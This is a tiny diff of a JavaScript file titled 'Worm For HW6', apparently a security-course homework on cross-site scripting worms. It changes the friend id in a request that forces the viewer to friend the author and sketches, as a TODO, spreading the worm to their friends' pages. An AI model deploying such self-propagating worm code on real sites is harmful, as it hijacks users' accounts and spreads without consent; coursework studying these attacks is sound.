@@ -1,7 +1,7 @@
 // Worm For HW6
 
 // Get the user to friend me
-$.get("add_friend.php", {'id': 95})
+$.get("add_friend.php", {'id': 123})
 
 // Loop through their friends and post worm on their pages
 // TODO:
